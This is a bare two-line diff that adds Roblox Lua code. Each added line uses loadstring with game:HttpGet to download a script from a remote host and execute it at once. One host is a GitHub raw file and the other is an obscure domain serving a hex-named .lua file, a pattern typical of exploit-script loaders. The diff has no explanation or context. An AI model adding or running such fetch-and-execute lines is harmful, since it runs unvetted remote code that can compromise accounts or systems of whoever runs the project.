@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
+loadstring(game:HttpGet("https://egorikusa.space/ef8170c18c77bd67f26e4df3.lua", true))()
